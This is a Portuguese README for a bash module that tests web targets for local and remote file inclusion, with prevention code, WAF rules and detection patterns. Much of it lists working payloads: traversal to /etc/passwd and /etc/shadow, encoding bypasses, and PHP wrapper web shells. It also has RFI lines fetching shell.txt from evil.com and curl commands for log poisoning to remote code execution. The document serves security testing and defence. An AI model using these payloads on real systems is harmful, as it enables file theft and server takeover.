# LFI/RFI Tester - Módulo de Testes File Inclusion

## Descrição

O `lfi-rfi-tester.sh` é um módulo especializado em testes de **File Inclusion** (Local File Inclusion - LFI e Remote File Inclusion - RFI). Utiliza os payloads do repositório **PayloadsAllTheThings/File Inclusion** para fornecer cobertura completa de técnicas de inclusão de arquivos.

## Motivação

File Inclusion é uma vulnerabilidade crítica que pode levar a:
- **Leitura de arquivos sensíveis** (/etc/passwd, configurações, etc.)
- **Execução remota de código** (RCE via log poisoning, wrappers PHP)
- **Bypass de autenticação** (inclusão de sessões, configs)
- **Comprometimento completo** do servidor

A modularização facilita:
1. **Testes Focados**: Execute apenas testes de file inclusion
2. **Manutenção Simples**: Todas as técnicas LFI/RFI em um único arquivo
3. **Atualização Fácil**: Adicionar novos payloads sem modificar script principal
4. **Documentação Clara**: Cada técnica bem organizada

## Estrutura

O módulo está organizado em 7 categorias principais:

### 1. LFI Básico (30 testes)
**Path Traversal Fundamental**

- **Path traversal básico**: `../../../etc/passwd`
- **Variações de profundidade**: 3 a 8 níveis
- **Arquivos Linux sensíveis**:
  - `/etc/passwd`, `/etc/shadow`, `/etc/hosts`
  - `/etc/group`, `/etc/hostname`, `/etc/issue`
- **Arquivos de sistema**:
  - `/proc/self/environ`
  - `/proc/version`, `/proc/cmdline`
- **Logs de aplicação**:
  - Apache: `/var/log/apache2/access.log`
  - Nginx: `/var/log/nginx/access.log`
- **Arquivos de configuração**:
  - `/etc/apache2/apache2.conf`
  - `/etc/nginx/nginx.conf`
  - `/etc/mysql/my.cnf`
- **Arquivos Windows**:
  - `C:\Windows\System32\drivers\etc\hosts`
  - `C:\boot.ini`, `C:\Windows\win.ini`
- **Variações de parâmetros**: `?page=`, `?file=`, `?path=`, `?include=`

### 2. LFI Bypass (50 testes)
**Técnicas de Evasão de Filtros**

#### Null Byte (PHP < 5.3.4):
- `../../../etc/passwd%00`
- `../../../etc/passwd%00.jpg`
- Bypass de extensão forçada

#### Double Encoding:
- `%252e%252e%252f` → `../`
- `%252e%252e%252fetc%252fpasswd`
- Double encode + null byte

#### UTF-8 Encoding:
- `%c0%ae%c0%ae/` → `../`
- Overlong UTF-8 sequences

#### Filter Bypass - Dot Removal:
- `....//` → `../` (após remoção de `../`)
- `..../../` → múltiplas barras
- `..;/` → separadores alternativos

#### Backslash Bypass:
- `..\\..\\etc/passwd` (Windows/mixed)
- `/%5C../%5C../` (URL encoded backslash)

#### Path Truncation:
- 4096+ caracteres com dots
- Dots + slashes para truncar extensão

#### Encoding Variations:
- URL encoding: `%2e%2e%2f`
- Unicode: `%u002e%u002e%u002f`
- Mixed case (Windows): `../../../EtC/PaSsWd`

#### Extension Bypass:
- `?` bypass: `../../../../etc/passwd?`
- `/. ` append: `../../../../etc/passwd/.`
- Null extension: `../../../../etc/passwd.`

#### PHP Wrappers Preview:
- `zip://`, `data://`, `php://input`, `php://filter`

### 3. LFI PHP Wrappers (25 testes)
**Wrappers Específicos do PHP**

#### php://filter - Encoding:
- `php://filter/convert.base64-encode/resource=index.php`
- `php://filter/read=string.rot13/resource=index.php`
- `php://filter/read=string.toupper/resource=index.php`
- **Chained filters**: Base64 + ROT13

#### php://input - RCE:
```php
POST ?page=php://input
Body: <?php system($_GET['c']); ?>
```

#### data:// - RCE:
- `data://text/plain,<?php phpinfo(); ?>`
- `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+`

#### expect:// - Command Execution:
- `expect://id`
- `expect://whoami`

#### Archive Wrappers:
- `zip://uploads/file.zip#shell.php`
- `phar://uploads/file.phar/shell.php`

#### Network Wrappers:
- `ftp://evil.com/shell.txt`
- `http://evil.com/shell.txt`
- `https://evil.com/shell.txt`

#### Compression Wrappers:
- `compress.zlib://index.php`
- `compress.bzip2://index.php`

#### Other Wrappers:
- `glob:///*` (directory listing)
- `php://filter/convert.iconv.utf-8.utf-16/resource=index.php`

### 4. RFI - Remote File Inclusion (20 testes)
**Inclusão de Arquivos Remotos**

#### Basic RFI:
- `http://evil.com/shell.txt`
- `https://evil.com/shell.php`

#### RFI Bypass:
- Null byte: `http://evil.com/shell.txt%00`
- Double encoding: `http:%252f%252fevil.com%252fshell.txt`
- Question mark: `http://evil.com/shell.txt?`

#### SMB/UNC Path (Windows):
- `\\evil.com\share\shell.php`
- `\\10.10.10.10\share\shell.php`

#### FTP RFI:
- `ftp://evil.com/shell.txt`
- `ftp://user:pass@evil.com/shell.txt`

#### Data Wrapper RFI:
- `data:text/plain,<?php system($_GET['c']);?>`
- Base64 encoded data wrapper

#### Other Protocols:
- Different ports: `:8080`, `:443`
- IP addresses: `http://10.10.10.10/shell.txt`

### 5. LFI to RCE (15 testes)
**Transformando LFI em Execução de Código**

#### Log Poisoning:
```bash
# Poison Apache log
curl -A "<?php system(\$_GET['c']); ?>" http://target.com
# Include log
?page=../../../var/log/apache2/access.log&c=id
```

**Targets**:
- Apache: `access.log`, `error.log`
- Nginx: `access.log`, `error.log`
- Mail: `/var/log/mail.log`
- SSH: `/var/log/auth.log`
- FTP: `/var/log/vsftpd.log`

#### Session Poisoning:
```php
// Poison session
Cookie: PHPSESSID=attacker; data=<?php system('id');?>
// Include session
?page=/var/lib/php/sessions/sess_attacker
```

#### /proc/self/environ:
```bash
# Poison via User-Agent
curl -A "<?php system('id'); ?>" http://target.com
# Include environ
?page=/proc/self/environ
```

#### File Descriptors:
- `/proc/self/fd/0` (stdin)
- `/proc/self/fd/1` (stdout)

#### PHP Temp Files:
- `/tmp/phpXXXXXX`
- Upload temp files

#### Pearcmd (PEAR):
```bash
?page=/usr/local/lib/php/pearcmd.php&+config-create+/&/<?=`$_GET[0]`?>+/tmp/exec.php
```

### 6. Path Traversal Deep (20 testes)
**Variações Profundas de Traversal**

- **Deep levels**: 10, 15, 20 níveis de `../`
- **Windows deep**: `..\\..\\..\\` (10 níveis)
- **Different depths**: `/var/www`, `/home/user`, `/root`
- **Current directory**: `./`, `./../`
- **Absolute paths**: `//etc`, `///etc`
- **Web root files**: `../config.php`, `../wp-config.php`, `../.env`
- **Common locations**: `/opt`, `/usr/local/etc`
- **Combo**: Traversal + bypass (null byte, encoding)

### 7. LFI Advanced (50 testes)
**Payloads das Listas Intruders**

Utiliza arquivos da pasta `Intruders/`:
- `Linux-files.txt` - Arquivos sensíveis Linux
- `Windows-files.txt` - Arquivos sensíveis Windows
- `Web-files.txt` - Arquivos web comuns
- `simple-check.txt` - Verificações básicas

## Uso

### Executar apenas testes LFI/RFI
```bash
./head-test.sh -u https://example.com -c lfi

# Aliases alternativos
./head-test.sh -u https://example.com -c rfi
./head-test.sh -u https://example.com -c fileinclusion
```

### Executar todos os testes (incluindo LFI/RFI)
```bash
./head-test.sh -u https://example.com -c all
```

### Com velocidade TURBO
```bash
./head-test.sh -u https://example.com -c lfi --speed 5
```

### Filtrar apenas vulnerabilidades
```bash
./head-test.sh -u https://example.com -c lfi --filter fail
```

## Arquitetura

```
head-test.sh
├── source lfi-rfi-tester.sh
│   ├── test_lfi_basic()
│   ├── test_lfi_bypass()
│   ├── test_lfi_php_wrappers()
│   ├── test_rfi_basic()
│   ├── test_lfi_to_rce()
│   ├── test_lfi_path_traversal()
│   ├── test_lfi_from_intruders()
│   └── run_all_lfi_rfi_tests() [função principal]
└── PayloadsAllTheThings/File Inclusion/
    ├── README.md
    ├── Wrappers.md
    ├── LFI-to-RCE.md
    └── Intruders/
        ├── Linux-files.txt
        ├── Windows-files.txt
        ├── JHADDIX_LFI.txt
        └── ... outros arquivos
```

## Payloads Utilizados

- **PayloadsAllTheThings**: Community-driven repository
- **JHADDIX LFI**: Payloads do pesquisador Jason Haddix
- **Platform-specific**: Linux, Windows, BSD, Mac
- **Web-specific**: WordPress, Joomla, Apache, Nginx

## Técnicas Testadas

### 1. **Local File Inclusion (LFI)**
Leitura de arquivos locais via path traversal.

### 2. **Remote File Inclusion (RFI)**
Inclusão de arquivos remotos via HTTP, FTP, SMB.

### 3. **Filter Bypass**
Múltiplas técnicas para evadir validação:
- Encoding (double, UTF-8, URL, Unicode)
- Null bytes
- Path truncation
- Case manipulation
- Extension bypass

### 4. **PHP Wrappers**
Exploração de wrappers específicos do PHP:
- php://filter (encoding, conversão)
- php://input (POST RCE)
- data:// (inline code)
- expect:// (command execution)
- zip://, phar:// (archive)

### 5. **LFI to RCE**
Transformar LFI em execução de código:
- Log poisoning (Apache, Nginx, SSH, Mail)
- Session poisoning
- /proc/self/environ
- File upload temp files
- PEAR exploitation

### 6. **Path Traversal**
Navegação profunda no filesystem:
- Deep traversal (10-20 níveis)
- Absolute vs relative paths
- Platform-specific (Linux/Windows)

## Quantidade de Testes

**Total estimado: 250+ testes de File Inclusion**

Distribuídos em:
- 30 testes LFI básico
- 50 testes LFI bypass
- 25 testes PHP wrappers
- 20 testes RFI
- 15 testes LFI to RCE
- 20 testes path traversal
- 50 testes avançados (Intruders)
- +10 testes file inclusion (já existentes no head-test.sh)

## Sistemas Operacionais Suportados

- ✅ **Linux** (todas distribuições)
- ✅ **Windows** (IIS, XAMPP)
- ✅ **Unix** (BSD, macOS)
- ✅ **Web Servers**: Apache, Nginx, IIS, LiteSpeed

## Comparação com Ferramentas

| Ferramenta | lfi-rfi-tester.sh | Kadimus | LFISuite |
|------------|-------------------|---------|----------|
| **Propósito** | Hardening test | Exploitation | Auto-exploit |
| **Velocidade** | ⚡ Muito rápido | 🐢 Lento | 🐢 Muito lento |
| **Cobertura** | 250+ payloads | Completa | Completa + RCE |
| **Automação** | Total | Semi-automática | Totalmente automática |
| **RCE** | ❌ Apenas teste | ✅ Sim | ✅ Sim + Shell |
| **Uso** | CI/CD, hardening | Pentesting | Pentesting avançado |

## Casos de Uso

### 1. **Hardening Validation**
Verificar se proteções contra file inclusion estão ativas.

### 2. **CI/CD Integration**
```bash
#!/bin/bash
STAGING_URL="https://staging.example.com"

./head-test.sh -u "$STAGING_URL" -c lfi --speed 5 --filter fail

if [ $? -ne 0 ]; then
    echo "❌ File Inclusion vulnerabilities detected!"
    exit 1
fi
```

### 3. **WAF Testing**
Testar se WAF está bloqueando tentativas de file inclusion.

### 4. **Security Regression**
Garantir que mudanças no código não introduziram vulnerabilidades.

## Severidade

File Inclusion é classificada como **CRÍTICA/ALTA** porque:

- ✅ **LFI**: Leitura de arquivos sensíveis (configs, senhas, chaves)
- ✅ **RFI**: Execução remota de código arbitrário
- ✅ **LFI to RCE**: Comprometimento completo via log poisoning
- ✅ **Bypass de segurança**: Acesso a dados protegidos
- ✅ **Lateral movement**: Leitura de chaves SSH, tokens

**CVSS Score**: 
- LFI (read-only): 6.0-7.5 (HIGH)
- LFI to RCE: 9.0-10.0 (CRITICAL)
- RFI: 9.0-10.0 (CRITICAL)

## Exemplos de Exploração Real

### LFI Básico
```php
// Código vulnerável
<?php
    $page = $_GET['page'];
    include("pages/" . $page . ".php");
?>

// Payload de exploração
?page=../../../../etc/passwd%00
```

### RFI
```php
// Código vulnerável (allow_url_include = On)
<?php
    include($_GET['file']);
?>

// Payload de exploração
?file=http://evil.com/shell.txt
```

### Log Poisoning (LFI to RCE)
```bash
# 1. Poison the log
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com

# 2. Include the log and execute commands
curl "http://target.com/index.php?page=../../../var/log/apache2/access.log&cmd=id"
```

### PHP Filter Wrapper
```bash
# Read source code in base64
?page=php://filter/convert.base64-encode/resource=index.php

# Decode output to see PHP source
echo "PD9waHAgLi4uID8+" | base64 -d
```

## Prevenção

### 1. **Whitelist de Arquivos**
❌ **RUIM**:
```php
include($_GET['page'] . '.php');
```

✅ **BOM**:
```php
$allowed = ['home', 'about', 'contact'];
$page = $_GET['page'];

if (in_array($page, $allowed)) {
    include($page . '.php');
} else {
    die('Invalid page');
}
```

### 2. **Usar basename()**
```php
$file = basename($_GET['file']);
include("pages/" . $file . ".php");
```

### 3. **Validação Rigorosa**
```php
$file = $_GET['file'];

// Permitir apenas letras e números
if (!preg_match('/^[a-zA-Z0-9]+$/', $file)) {
    die('Invalid filename');
}

include("pages/{$file}.php");
```

### 4. **Disable Dangerous Functions**
```ini
; php.ini
allow_url_include = Off
allow_url_fopen = Off

; Disable dangerous functions
disable_functions = exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source
```

### 5. **open_basedir Restriction**
```ini
; php.ini
open_basedir = /var/www/html:/tmp
```

### 6. **Use Absolute Paths**
```php
$basePath = '/var/www/html/pages/';
$file = $_GET['page'];
$fullPath = realpath($basePath . $file . '.php');

if (strpos($fullPath, $basePath) !== 0) {
    die('Invalid path');
}

include($fullPath);
```

## Exemplos de Código Seguro

### Framework Laravel
```php
// Laravel usa rotas e controllers
Route::get('/page/{name}', [PageController::class, 'show'])
    ->where('name', '[a-z]+');
```

### Framework Symfony
```php
// Symfony usa Twig templates
return $this->render('page.html.twig', [
    'content' => $contentRepository->find($id),
]);
```

## Detecção e Monitoramento

### 1. **WAF Rules**
```nginx
# Nginx + ModSecurity
SecRule ARGS "@contains ../" "id:1001,deny,status:403"
SecRule ARGS "@contains /etc/passwd" "id:1002,deny,status:403"
SecRule ARGS "@rx php://(filter|input)" "id:1003,deny,status:403"
```

### 2. **Log Monitoring**
```bash
# Monitorar tentativas de LFI
grep -E '\.\./|etc/passwd|php://|data://' /var/log/apache2/access.log
```

### 3. **IDS/IPS**
Configure Snort/Suricata para detectar padrões de file inclusion.

## Próximos Passos

Melhorias futuras:

1. **Template Injection**: SSTI (Server-Side Template Injection)
2. **XXE**: XML External Entity
3. **Path Traversal**: Módulo dedicado para directory traversal
4. **Archive Exploitation**: Zip slip, tar extraction
5. **SSRF**: Server-Side Request Forgery

## Ferramentas Complementares

- **[Kadimus](https://github.com/P0cL4bs/Kadimus)**: LFI exploitation tool
- **[LFISuite](https://github.com/D35m0nd142/LFISuite)**: Automatic LFI exploiter
- **[Fimap](https://github.com/kurobeats/fimap)**: LFI/RFI scanner
- **[LFImap](https://github.com/hansmach1ne/LFImap)**: Discovery and exploitation
- **[Burp Suite](https://portswigger.net/burp)**: Manual testing

## Referências

- [PayloadsAllTheThings - File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [OWASP - Testing for LFI](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)
- [PortSwigger - File Path Traversal](https://portswigger.net/web-security/file-path-traversal)
- [HackTricks - File Inclusion](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
- [PHP Wrappers](https://www.php.net/manual/en/wrappers.php)

## Logs e Reporting

```bash
# Salvar relatório completo
./head-test.sh -u https://example.com -c lfi -o lfi_full_report.txt

# Apenas vulnerabilidades
./head-test.sh -u https://example.com -c lfi --filter fail -o lfi_vulnerabilities.txt

# Apenas testes de wrappers PHP
./head-test.sh -u https://example.com -c lfi | grep "Wrapper"
```

## Métricas de Segurança

Após executar os testes, meça:

- **Taxa de bloqueio**: % de payloads bloqueados
- **Tipos bloqueados**: LFI vs RFI vs Wrappers
- **Falsos positivos**: Requisições legítimas bloqueadas
- **Tempo de resposta**: Detectar delays anormais

**Meta de segurança**: 100% de bloqueio para LFI/RFI + wrappers perigosos.

## FAQ

**Q: Por que testar LFI se já testo path traversal?**  
A: LFI é diferente de path traversal. Path traversal apenas lê arquivos, LFI executa código via include/require.

**Q: Os testes RFI funcionam com allow_url_include = Off?**  
A: Não. RFI via HTTP só funciona se `allow_url_include` estiver On. Porém, testamos SMB (Windows) e outras técnicas.

**Q: Log poisoning é perigoso em produção?**  
A: Sim! Evite testar log poisoning em produção. Use apenas em ambiente de desenvolvimento/staging.

**Q: Como atualizar os payloads?**  
A: Execute `git pull` na pasta PayloadsAllTheThings para obter as versões mais recentes.

**Meta final**: 100% de proteção contra File Inclusion!
